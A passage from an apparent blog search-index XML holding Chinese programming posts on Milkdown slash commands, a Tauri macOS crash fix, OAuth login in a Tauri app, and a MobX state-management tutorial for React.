class="string">&quot;blockquote&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;table&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;表格&quot;</span>, <span class="string">&quot;table&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;InsertTable&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;table&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;table&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;code&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;代码块&quot;</span>, <span class="string">&quot;code&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TurnIntoCodeFence&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;code&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;fence&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;divider&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;分隔符&quot;</span>, <span class="string">&quot;divider&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;InsertHr&quot;</span>),</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;divider&quot;</span>, <span class="string">&quot;hr&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;hr&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">&quot;h4&quot;</span>,</span><br><span class="line">      <span class="attr">dom</span>: <span class="title function_">createDropdownItem</span>(ctx.<span class="title function_">get</span>(themeManagerCtx), <span class="string">&quot;测试&quot;</span>, <span class="string">&quot;h3&quot;</span>),</span><br><span class="line">      <span class="attr">command</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        ctx.<span class="title function_">get</span>(commandsCtx).<span class="title function_">call</span>(<span class="string">&quot;TaskList&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">keyword</span>: [<span class="string">&quot;h4&quot;</span>, <span class="string">&quot;Test&quot;</span>],</span><br><span class="line">      <span class="attr">typeName</span>: <span class="string">&quot;heading&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> userInput = input.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">toLocaleLowerCase</span>();</span><br><span class="line">  <span class="keyword">return</span> actions</span><br><span class="line">    .<span class="title function_">filter</span>(</span><br><span class="line">      <span class="function">(<span class="params">action</span>) =&gt;</span></span><br><span class="line">        !!nodes[action.<span class="property">typeName</span>] &amp;&amp;</span><br><span class="line">        action.<span class="property">keyword</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">keyword</span>) =&gt;</span> keyword.<span class="title function_">includes</span>(userInput))</span><br><span class="line">    )</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; keyword, typeName, ...action &#125;</span>) =&gt;</span> action);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> diySlash = slash.<span class="title function_">configure</span>(slashPlugin, &#123;</span><br><span class="line">  <span class="attr">config</span>: <span class="function">(<span class="params">ctx</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 获取自定义的斜线命令</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">actions</span>: any = <span class="title function_">diyActions</span>(ctx);</span><br><span class="line">    <span class="comment">// Define a status builder</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">&#123; isTopLevel, content, parentNode &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!isTopLevel) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (!content) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">placeholder</span>: <span class="string">&quot;输入/来使用斜杠命令...&quot;</span> &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (content.<span class="title function_">startsWith</span>(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> content === <span class="string">&quot;/&quot;</span></span><br><span class="line">          ? &#123;</span><br><span class="line">              <span class="attr">placeholder</span>: <span class="string">&quot;请选择类型...&quot;</span>,</span><br><span class="line">              <span class="attr">actions</span>: <span class="title function_">diyActions</span>(ctx),</span><br><span class="line">            &#125;</span><br><span class="line">          : &#123;</span><br><span class="line">              <span class="attr">actions</span>: <span class="title function_">diyActions</span>(ctx, content),</span><br><span class="line">            &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>使用方式：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; editor &#125; = <span class="title function_">useEditor</span>(<span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">editor</span>: <span class="title class_">Editor</span>  <span class="literal">undefined</span> = <span class="title class_">Editor</span>.<span class="title function_">make</span>()</span><br><span class="line">    .<span class="title function_">config</span>(<span class="function">(<span class="params">ctx</span>) =&gt;</span> &#123;</span><br><span class="line">      ctx.<span class="title function_">set</span>(rootCtx, root);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 自定义斜线命令</span></span><br><span class="line">    .<span class="title function_">use</span>(diySlash)</span><br><span class="line">    <span class="comment">// 自定义命令，这斜线命令使用了自定义的命令，所以这里也一定要加上。如何自定义指令</span></span><br><span class="line">    .<span class="title function_">use</span>(taskListPlugin);</span><br><span class="line">  <span class="keyword">return</span> editor;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我这样写的几个好处是：</p><ul><li>可以自定义列表的排序</li><li>可以添加自定义指令，比如我的最后一个就是自定义的指令</li><li>通俗易懂，比官方的看的更明白</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
            <tag> Milkdown </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tauri 在低版本Mac系统的报错解决方法</title>
      <link href="/197dd8f00be1/"/>
      <url>/197dd8f00be1/</url>
      
        <content type="html"><![CDATA[<p>今天笔者朋友用Tauri在Mac系统开发应用时，软件异常崩溃。报错信息如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attempt to insert nil object from objects[15]</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2022/11/402876656.png" alt="2022-11-01T09:05:31.png" title="2022-11-01T09:05:31.png"></p><p>这个问题其实是因为Mac系统版本太低了，这里有两种解决方案。<br>第一种：升级Mac至12.3.x或更高版本<br>第二种：设置全局样式，如下代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">pointer-events</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tauri </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust - Tauri实现OAuth登录</title>
      <link href="/ea6de6ce3f5b/"/>
      <url>/ea6de6ce3f5b/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><blockquote><p>注意，本文不介绍Rust&#x2F;Tauri&#x2F;OAuth相关概念!!</p></blockquote><p>由于最近和朋友打算一起写一款ToDo-List软件，其中有一个需求是减少用户对账号密码的管理，比如我就特别讨厌每用一个软件都需要记一个密码。而且密码还最好与之前的密码不重复，所以对接一个OAuth系统就显得非常必要了。</p><ul><li>Rust参考教程：<a href="https://www.bilibili.com/video/BV1hp4y1k7SV">https://www.bilibili.com/video/BV1hp4y1k7SV</a>  </li><li>Tauri官网：<a href="https://tauri.app/">https://tauri.app/</a>  </li><li>OAuth参考链接：<a href="http://blog.codezf.com/archives/5/">http://blog.codezf.com/archives/5/</a></li></ul><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><hr><p>首先我们知道OAuth这类认证都有一个重定向地址，当你完成登录操作后会重定向到你指定的url中。而我们是桌面端无法提供一个url给OAuth完成认证的。</p><p>那么如何解决这个问题呢，其实很简单，参考主流软件都可以得到一个简单的思路，利用服务器构造一个可以访问的页面当作回调地址，得到OAuth的Code后将其返回给应用端。但这里引入了第二个问题，网页返回的内容如何传递给应用端，其实也很简单，不要整花里胡哨的东西，就给应用端塞一个web服务端功能就好了。</p><blockquote><p>注意：OAuth返回的结果要么是json，要么是路径参数，但是它是以页面形式返回的。无法和正常接口一样利用js获取到，所以我们这里需要引入一个web服务端功能</p></blockquote><p>这里我采用的是一款优秀的web库，Salvo库。Salvo 构建于 tokio 和 hyper 之上. 仅仅需要 Rust 基础知识即可开发功能强大的后端服务。</p><ul><li>crates地址：<a href="https://crates.io/crates/salvo">https://crates.io/crates/salvo</a>  </li><li>中文文档：<a href="https://salvo.rs/zh-hans/">https://salvo.rs/zh-hans/</a></li></ul><p><strong>整体流程如下所示：</strong></p><ol><li>应用端通过Shell唤起默认浏览器打开认证地址</li><li>认证完后通过重定向地址重定向到我们构造在云服务器上的网页</li><li>该网页得到OAuth的code后，通过ajax或axios等请求我们tauri程序自带的服务端接口</li><li>本地服务端得到OAuth的code后，通过tauri的emit函数通知js代码继续后续操作</li><li>最后提示用户可以关闭授权的网页了</li></ol><p><strong>注意：</strong> 上述步骤使用默认浏览器是为了方便例如github这类OAuth登录的，因为如果默认浏览器登录过就无需再次登录了。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><hr><p>本文的最大问题是无法关闭通过Shell打开的浏览器页面，使用<code>window.close()</code>函数会提示<code>Scripts may close only the windows that were opened by them.</code>，如果你有更好的办法，可以留言互相学习一下。</p>]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OAuth </tag>
            
            <tag> Rust </tag>
            
            <tag> Tauri </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React - Mobx</title>
      <link href="/3cf04c8c9ed3/"/>
      <url>/3cf04c8c9ed3/</url>
      
        <content type="html"><![CDATA[<h1 id="Mobx介绍"><a href="#Mobx介绍" class="headerlink" title="Mobx介绍"></a>Mobx介绍</h1><blockquote><p>一个可以和React良好配合的集中状态管理工具，和Redux解决的问题相似，都可以独立组件进行集中状态管理</p></blockquote><p><img src="/../uploads/2022/10/2450800585.png" alt="2022-10-20T08:31:15.png" title="2022-10-20T08:31:15.png"></p><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ol><li><strong>简单</strong>，编写无模板的极简代码精准描述你的意图</li><li><strong>轻松实现最优渲染</strong>，依赖自动追踪，实现最小渲染优化</li><li><strong>架构自由</strong>，可移植, 可测试 无特殊心智负担</li></ol><h1 id="配置开发环境"><a href="#配置开发环境" class="headerlink" title="配置开发环境"></a>配置开发环境</h1><hr><p>Mobx是一个独立的响应式的库，可以独立于任何UI框架存在，但是通常大家习惯把它和React进行绑定使用，用Mobx来做响应式数据建模，React作为UI视图框架渲染内容，我们环境的配置需要三个部分<br>1、一个create-react-app创建好的React项目环境<br>2、mobx框架本身<br>3、一个用来链接mobx和React的中间件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装mobx和中间件工具 mobx-react-lite  只能函数组件中使用</span></span><br><span class="line">$ yarn add mobx mobx-react-lite</span><br></pre></td></tr></table></figure><h1 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h1><hr><h2 id="1-初始化mobx"><a href="#1-初始化mobx" class="headerlink" title="1. 初始化mobx"></a>1. 初始化mobx</h2><p>初始化步骤：<br>1、定义数据状态state<br>2、在构造器中实现数据响应式处理 makeAutoObservble<br>3、定义修改数据的函数action<br>4、实例化store并导出</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; makeAutoObservable &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CounterStore</span> &#123;</span><br><span class="line">  count = <span class="number">0</span> <span class="comment">// 定义数据</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="title function_">makeAutoObservable</span>(<span class="variable language_">this</span>)  <span class="comment">// 响应式处理</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 定义修改数据的方法</span></span><br><span class="line">  addCount = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter = <span class="keyword">new</span> <span class="title class_">CounterStore</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counter</span><br></pre></td></tr></table></figure><h2 id="2-React使用store"><a href="#2-React使用store" class="headerlink" title="2. React使用store"></a>2. React使用store</h2><p>实现步骤：<br>1、在组件中导入counterStore实例对象<br>2、在组件中使用storeStore实例对象中的数据<br>3、通过事件调用修改数据的方法修改store中的数据<br>4、让组件响应数据变化</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入counterStore</span></span><br><span class="line"><span class="keyword">import</span> counterStore <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// 导入observer方法</span></span><br><span class="line"><span class="keyword">import</span> &#123; observer &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx-react-lite&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> counterStore.addCount()&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        &#123;counterStore.count&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 包裹组件让视图响应数据变化</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">observer</span>(<span class="title class_">App</span>)</span><br></pre></td></tr></table></figure><h1 id="计算属性（衍生状态）"><a href="#计算属性（衍生状态）" class="headerlink" title="计算属性（衍生状态）"></a>计算属性（衍生状态）</h1><hr><blockquote><p>概念: 基于一个原始的数据，经过特定的计算，得到一个新的数据，且能在原始的数据发生变化的时候，他同时进行重新计算。</p></blockquote><p><img src="/../uploads/2022/10/4114251849.png" alt="2022-10-20T08:36:15.png" title="2022-10-20T08:36:15.png"></p><p><strong>实现步骤：</strong></p><ol><li>声明一个存在的数据</li><li>通过get关键词 定义计算属性</li><li>在 makeAutoObservable 方法中标记计算属性</li></ol><p><strong>conterStore.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; computed, makeAutoObservable &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CounterStore</span> &#123;</span><br><span class="line">  list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">makeAutoObservable</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">      <span class="attr">filterList</span>: computed</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 修改原数组</span></span><br><span class="line">  changeList = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">push</span>(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 定义计算属性</span></span><br><span class="line">  get filterList () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item &gt; <span class="number">4</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter = <span class="keyword">new</span> <span class="title class_">CounterStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counter</span><br></pre></td></tr></table></figure><p><strong>App.jsx</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入counterStore</span></span><br><span class="line"><span class="keyword">import</span> counterStore <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// 导入observer方法</span></span><br><span class="line"><span class="keyword">import</span> &#123; observer &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx-react-lite&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 原数组 */&#125;</span></span><br><span class="line"><span class="language-xml">      &#123;JSON.stringify(counterStore.list)&#125;</span></span><br><span class="line"><span class="language-xml">      &#123;/* 计算属性 */&#125;</span></span><br><span class="line"><span class="language-xml">      &#123;JSON.stringify(counterStore.filterList)&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> counterStore.changeList()&#125;&gt;change list<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 包裹组件让视图响应数据变化</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">observer</span>(<span class="title class_">App</span>)</span><br></pre></td></tr></table></figure><h1 id="异步数据处理"><a href="#异步数据处理" class="headerlink" title="异步数据处理"></a>异步数据处理</h1><hr><p>测试接口: <a href="http://geek.itheima.net/v1/_0/channels">http://geek.itheima.net/v1\_0/channels</a><br>实现步骤:<br>1、在mobx中编写异步请求方法 获取数据 存入state中<br>2、组件中通过 useEffect + 空依赖 触发action函数的执行</p><p><strong>channelStore.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 异步的获取</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; makeAutoObservable &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelStore</span> &#123;</span><br><span class="line">  channelList = []</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">makeAutoObservable</span>(<span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 只要调用这个方法 就可以从后端拿到数据并且存入channelList</span></span><br><span class="line">  setChannelList = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;http://geek.itheima.net/v1_0/channels&#x27;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">channelList</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">channels</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> channlStore = <span class="keyword">new</span> <span class="title class_">ChannelStore</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> channlStore</span><br></pre></td></tr></table></figure><p><strong>App.jsx</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; useStore &#125; <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; observer &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx-react-lite&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; channlStore &#125; = <span class="title function_">useStore</span>()</span><br><span class="line">  <span class="comment">// 1. 使用数据渲染组件</span></span><br><span class="line">  <span class="comment">// 2. 触发action函数发送异步请求</span></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    channlStore.<span class="title function_">setChannelList</span>()</span><br><span class="line">  &#125;, [])</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;channlStore.channelList.map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ))&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 让组件可以响应数据的变化[也就是数据一变组件重新渲染]</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">observer</span>(<span class="title class_">App</span>)</span><br></pre></td></tr></table></figure><h1 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h1><hr><p>场景: 一个项目有很多的业务模块，我们不能把所有的代码都写到一起，这样不好维护，提了提供可维护性，需要引入模块化机制</p><p><img src="/../uploads/2022/10/2897054055.png" alt="2022-10-20T08:39:30.png" title="2022-10-20T08:39:30.png"></p><p><strong>实现步骤</strong>：</p><ol><li>拆分模块js文件，每个模块中定义自己独立的state&#x2F;action</li><li>在store&#x2F;index.js中导入拆分之后的模块，进行模块组合</li><li>利用React的context的机制导出统一的useStore方法，给业务组件使用</li></ol><h2 id="1、定义task模块"><a href="#1、定义task模块" class="headerlink" title="1、定义task模块"></a>1、定义task模块</h2><p><strong>store&#x2F;taskStore.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; makeAutoObservable &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaskStore</span> &#123;</span><br><span class="line">  taskList = []</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">makeAutoObservable</span>(<span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  addTask () &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">taskList</span>.<span class="title function_">push</span>(<span class="string">&#x27;vue&#x27;</span>, <span class="string">&#x27;react&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> task = <span class="keyword">new</span> <span class="title class_">TaskStore</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> task</span><br></pre></td></tr></table></figure><h2 id="2、定义counterStore"><a href="#2、定义counterStore" class="headerlink" title="2、定义counterStore"></a>2、定义counterStore</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; makeAutoObservable 